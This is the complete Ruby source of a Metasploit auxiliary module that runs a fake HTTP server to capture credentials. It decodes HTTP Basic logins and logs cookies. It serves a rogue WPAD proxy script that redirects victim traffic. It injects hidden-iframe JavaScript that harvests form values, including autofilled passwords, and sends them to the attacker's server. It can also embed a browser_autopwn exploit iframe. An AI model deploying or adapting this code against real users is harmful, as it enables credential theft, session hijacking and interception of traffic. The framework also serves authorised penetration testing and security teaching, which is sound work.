##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'English'
class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::TcpServer
  include Msf::Auxiliary::Report

  def initialize
    super(
      'Name' => 'Authentication Capture: HTTP',
      'Description' => %q{
        This module provides a fake HTTP service that
      is designed to capture authentication credentials.
      },
      'Author' => ['ddz', 'hdm'],
      'License' => MSF_LICENSE,
      'Actions' => [
        [ 'Capture', { 'Description' => 'Run capture web server' } ]
      ],
      'PassiveActions' => [
        'Capture'
      ],
      'DefaultAction' => 'Capture',
      'Notes' => {
        'Stability' => [CRASH_SAFE],
        'SideEffects' => [],
        'Reliability' => []
      }
    )

    register_options(
      [
        OptPort.new('SRVPORT', [ true, 'The local port to listen on.', 80 ]),
        OptPath.new('TEMPLATE', [
          false, 'The HTML template to serve in responses',
          File.join(Msf::Config.data_directory, 'exploits', 'capture', 'http', 'index.html')
        ]),
        OptPath.new('SITELIST', [
          false, 'The list of URLs that should be used for cookie capture',
          File.join(Msf::Config.data_directory, 'exploits', 'capture', 'http', 'sites.txt')
        ]),
        OptPath.new('FORMSDIR', [
          false, 'The directory containing form snippets (example.com.txt)',
          File.join(Msf::Config.data_directory, 'exploits', 'capture', 'http', 'forms')
        ]),
        OptAddress.new('AUTOPWN_HOST', [ false, 'The IP address of the browser_autopwn service ', nil ]),
        OptPort.new('AUTOPWN_PORT', [ false, 'The SRVPORT port of the browser_autopwn service ', nil ]),
        OptString.new('AUTOPWN_URI', [ false, 'The URIPATH of the browser_autopwn service ', nil ]),
      ]
    )
  end

  # Not compatible today
  def support_ipv6?
    false
  end

  def run
    @formsdir = datastore['FORMSDIR']
    @template = datastore['TEMPLATE']
    @sitelist = datastore['SITELIST']
    @myhost = datastore['SRVHOST']
    @myport = datastore['SRVPORT']

    @myautopwn_host = datastore['AUTOPWN_HOST']
    @myautopwn_port = datastore['AUTOPWN_PORT']
    @myautopwn_uri = datastore['AUTOPWN_URI']
    @myautopwn = false

    if @myautopwn_host && @myautopwn_port && @myautopwn_uri
      @myautopwn = true
    end

    exploit
  end

  def on_client_connect(client)
    client.extend(Rex::Proto::Http::ServerClient)
    client.init_cli(self)
  end

  def on_client_data(cli)
    begin
      data = cli.get_once(-1, 5)
      raise ::Errno::ECONNABORTED if !data || data.empty?

      case cli.request.parse(data)
      when Rex::Proto::Http::Packet::ParseCode::Completed
        dispatch_request(cli, cli.request)
        cli.reset_cli
      when Rex::Proto::Http::Packet::ParseCode::Error
        close_client(cli)
      end
    rescue ::EOFError, ::Errno::EACCES, ::Errno::ECONNABORTED, ::Errno::ECONNRESET => e
      vprint_error(e.message)
    rescue ::OpenSSL::SSL::SSLError => e
      vprint_error(e.message)
    rescue StandardError
      print_error("Error: #{$ERROR_INFO.class} #{$ERROR_INFO} #{$ERROR_INFO.backtrace}")
    end

    close_client(cli)
  end

  def close_client(cli)
    cli.close
    # Require to clean up the service properly
    raise ::EOFError
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: opts[:service_name],
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:password],
      private_type: :password
    }.merge(service_data)

    login_data = {
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::UNTRIED,
      proof: opts[:proof]
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def dispatch_request(cli, req)
    cli.peerhost

    os_name = nil

    ua_name = nil
    ua_vers = nil

    ua = req['User-Agent']

    case ua
    when /rv:([\d.]+)/
      ua_name = 'FF'
      ua_vers = ::Regexp.last_match(1)
    when %r{Mozilla/[0-9]\.[0-9] \(compatible; MSIE ([0-9]+\.[0-9]+)}
      ua_name = 'IE'
      ua_vers = ::Regexp.last_match(1)
    when %r{Version/(\d+\.\d+\.\d+).*Safari}
      ua_name = 'Safari'
      ua_vers = ::Regexp.last_match(1)
    end

    case ua
    when /Windows/
      os_name = 'Windows'
    when /Linux/
      os_name = 'Linux'
    when /iPhone/
      os_name = 'iPhone'
      'armle'
    when /Mac OS X/
      os_name = 'Mac'
    end

    case ua
    when /PPC/
      'ppc'
    end

    os_name ||= 'Unknown'

    mysrc = Rex::Socket.source_address(cli.peerhost)
    hhead = req['Host'] || @myhost

    if req.resource =~ %r{^http:/+([^/]+)(/*.*)}
      hhead = ::Regexp.last_match(1)
      req.resource = ::Regexp.last_match(2)
    end

    if hhead =~ /^(.*):(\d+)\s*$/
      hhead = ::Regexp.last_match(1)
      nport = ::Regexp.last_match(2).to_i
    end

    @myport = nport || 80

    cookies = req['Cookie'] || ''

    if !cookies.empty?
      report_note(
        :host => cli.peerhost,
        :type => "http_cookies",
        :data => { :cookies => hhead + " " + cookies },
        :update => :unique_data
      )
    end

    if req['Authorization'] && req['Authorization'] =~ /basic/i
      _, auth = req['Authorization'].split(/\s+/)
      user, pass = Rex::Text.decode_base64(auth).split(':', 2)

      report_cred(
        ip: cli.peerhost,
        port: @myport,
        service_name: (ssl ? 'https' : 'http'),
        user: user,
        pass: pass,
        proof: req.resource.to_s
      )

      report_note(
        :host     => cli.peerhost,
        :type     => "http_auth_extra",
        :data     => { :auth_extra => req.resource.to_s },
        :update => :unique_data
      )
      print_good("HTTP LOGIN #{cli.peerhost} > #{hhead}:#{@myport} #{user} / #{pass} => #{req.resource}")
    end

    if (req.resource =~ %r{^/*wpad.dat|.*\.pac$}i)
      prx = "function FindProxyForURL(url, host) { return 'PROXY #{mysrc}:#{@myport}'; }"
      res =
        "HTTP/1.1 200 OK\r\n" \
        "Host: #{hhead}\r\n" \
        "Content-Type: application/x-ns-proxy-autoconfig\r\n" \
        "Content-Length: #{prx.length}\r\n" \
        "Connection: Close\r\n\r\n#{prx}"
      print_status("HTTP wpad.dat sent to #{cli.peerhost}")
      cli.put(res)
      return
    end

    if (req.resource =~ %r{/+formrec/(.*)}i)
      data = Rex::Text.uri_decode(::Regexp.last_match(1)).split("\x00").join(', ')

      report_note(
        :host => cli.peerhost,
        :type => "http_formdata",
        :data => { :formdata => hhead + " " + data },
        :update => :unique_data
      )

      res =
        "HTTP/1.1 200 OK\r\n" \
        "Host: #{hhead}\r\n" \
        "Content-Type: text/html\r\n" \
        "Content-Length: 4\r\n" \
        "Connection: Close\r\n\r\nBYE!"

      print_status("HTTP form data received for #{hhead} from #{cli.peerhost} (#{data})")
      cli.put(res)
      return
    end

    report_note(
      :host => cli.peerhost,
      :type => "http_request",
      :data => { :request => "#{hhead}:#{@myport} #{req.method} #{req.resource} #{os_name} #{ua_name} #{ua_vers}" },
      :update => :unique_data
    )

    print_status("HTTP REQUEST #{cli.peerhost} > #{hhead}:#{@myport} #{req.method} #{req.resource} #{os_name} #{ua_name} #{ua_vers} cookies=#{cookies}")

    if (req.resource =~ %r{/+forms.html$})
      frm = inject_forms(hhead)
      res =
        "HTTP/1.1 200 OK\r\n" \
        "Host: #{hhead}\r\n" \
        "Content-Type: text/html\r\n" \
        "Content-Length: #{frm.length}\r\n" \
        "Connection: Close\r\n\r\n#{frm}"
      cli.put(res)
      return
    end

    # http://us.version.worldofwarcraft.com/update/PatchSequenceFile.txt
    if (req.resource == '/update/PatchSequenceFile.txt')
      print_status("HTTP #{cli.peerhost} is trying to play World of Warcraft")
    end

    # Microsoft 'Network Connectivity Status Indicator' Vista
    if (req['Host'] == 'www.msftncsi.com')
      print_status("HTTP #{cli.peerhost} requested the Network Connectivity Status Indicator page (Vista)")
      data = 'Microsoft NCSI'
      res =
        "HTTP/1.1 200 OK\r\n" \
        "Host: www.msftncsi.com\r\n" \
        "Expires: 0\r\n" \
        "Cache-Control: must-revalidate\r\n" \
        "Content-Type: text/html\r\n" \
        "Content-Length: #{data.length}\r\n" \
        "Connection: Close\r\n\r\n#{data}"
      cli.put(res)
      return
    end

=begin
    # Apple 'Network Status' Check (prevents a pop-up safari on the iphone)
    if(req['Host'] == 'www.apple.com' and req.resource == '/library/test/success.html')
      data = "\x3c\x21\x44\x4f\x43\x54\x59\x50\x45\x20\x48\x54\x4d\x4c\x20\x50\x55\x42\x4c\x49\x43\x20\x22\x2d\x2f\x2f\x57\x33\x43\x2f\x2f\x44\x54\x44\x20\x48\x54\x4d\x4c\x20\x33\x2e\x32\x2f\x2f\x45\x4e\x22\x3e\x0a\x3c\x48\x54\x4d\x4c\x3e\x0a\x3c\x48\x45\x41\x44\x3e\x0a\x09\x3c\x54\x49\x54\x4c\x45\x3e\x53\x75\x63\x63\x65\x73\x73\x3c\x2f\x54\x49\x54\x4c\x45\x3e\x0a\x3c\x2f\x48\x45\x41\x44\x3e\x0a\x3c\x42\x4f\x44\x59\x3e\x0a\x53\x75\x63\x63\x65\x73\x73\x0a\x3c\x2f\x42\x4f\x44\x59\x3e\x0a\x3c\x2f\x48\x54\x4d\x4c\x3e\x0a"
      res  =
        "HTTP/1.1 200 OK\r\n" +
        "Host: www.apple.com\r\n" +
        "Expires: 0\r\n" +
        "Cache-Control: must-revalidate\r\n" +
        "Content-Type: text/html\r\n" +
        "Content-Length: #{data.length}\r\n" +
        "Connection: Close\r\n\r\n#{data}"
      cli.put(res)
      return
    end
=end

    # Microsoft ActiveX Download
    if (req['Host'] == 'activex.microsoft.com')
      print_status("HTTP #{cli.peerhost} attempted to download an ActiveX control")
      data = ''
      res =
        "HTTP/1.1 404 Not Found\r\n" \
        "Host: #{mysrc}\r\n" \
        "Content-Type: application/octet-stream\r\n" \
        "Content-Length: #{data.length}\r\n" \
        "Connection: Close\r\n\r\n#{data}"
      cli.put(res)
      return
    end

    # Sonic.com's Update Service
    if (req['Host'] == 'updateservice.sonic.com')
      print_status("HTTP #{cli.peerhost} is running a Sonic.com product that checks for online updates")
    end

    # The google maps / stocks view on the iPhone
    if (req['Host'] == 'iphone-wu.apple.com')
      case req.resource
      when '/glm/mmap'
        print_status("HTTP #{cli.peerhost} is using Google Maps on the iPhone")
      when '/dgw'
        print_status("HTTP #{cli.peerhost} is using Stocks/Weather on the iPhone")
      else
        print_status("HTTP #{cli.peerhost} is request #{req.resource} via the iPhone")
      end
    end

    # The itunes store on the iPhone
    if (req['Host'] == 'phobos.apple.com')
      print_status("HTTP #{cli.peerhost} is using iTunes Store on the iPhone")
      # GET /bag.xml
    end

    # Handle image requests
    ctypes =
      {
        'jpg' => 'image/jpeg',
        'jpeg' => 'image/jpeg',
        'png' => 'image/png',
        'gif' => 'image/gif'
      }

    req_ext = req.resource.split('.')[-1].downcase

    if ctypes[req_ext]
      ctype = ctypes['gif']

      data =
        "\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00" \
        "\x00\xff\xff\xff\xff\xff\xff\x2c\x00\x00\x00\x00" \
        "\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b"

      res =
        "HTTP/1.1 200 OK\r\n" \
        "Host: #{mysrc}\r\n" \
        "Content-Type: #{ctype}\r\n" \
        "Content-Length: #{data.length}\r\n" \
        "Connection: Close\r\n\r\n#{data}"
      cli.put(res)
      return
    end

    buff = ''

    if @myautopwn
      buff << "<iframe src='http://#{@myautopwn_host}:#{@myautopwn_port}#{@myautopwn_uri}'></iframe>"
    end

    list = File.readlines(@sitelist)
    list.each do |site|
      next if site =~ /^#/

      site.strip!
      next if site.empty?

      buff << "<iframe src='http://#{site}:#{@myport}/forms.html'></iframe>"
    end

    data = File.read(@template)
    data.gsub!(/%CONTENT%/, buff)

    res =
      "HTTP/1.1 200 OK\r\n" \
      "Host: #{mysrc}\r\n" \
      "Expires: 0\r\n" \
      "Cache-Control: must-revalidate\r\n" \
      "Content-Type: text/html\r\n" \
      "Content-Length: #{data.length}\r\n" \
      "Connection: Close\r\n\r\n#{data}"

    cli.put(res)
    return
  end

  def inject_forms(site)
    domain = site.gsub(%r{(\.\.|\\|/)}, '')
    domain = 'www.' + domain if domain !~ /^www/i

    until domain.empty?

      form_file = File.join(@formsdir, domain) + '.txt'
      form_data = ''
      if File.readable?(form_file)
        form_data = File.read(form_file)
        break
      end

      parts = domain.split('.')
      parts.shift
      domain = parts.join('.')
    end

    %|
<html>
<head>
  <script language="javascript">
    function processForms() {
      var i = 0;
      while(form = document.forms[i]) {

        res = "";
        var x = 0;
        var f = 0;

        while(e = form.elements[x]) {
          if (e.name.length > 0 && e.value.length > 0 && e.value != "on"){
            res += e.name + "=" + e.value + "\x00";
            f=1;
          }
          x++;
        }

        if(f) {
          url = "http://"+document.domain+":#{@myport}/formrec/" + escape(res);
          fra = document.createElement("iframe");
          fra.setAttribute("src", url);
          fra.style.visibility = 'hidden';
          document.body.appendChild(fra);
        }

        i++;
      }
    }
  </script>
</head>
<body onload="processForms()">

#{form_data}

</body>
</html>
|
  end
end
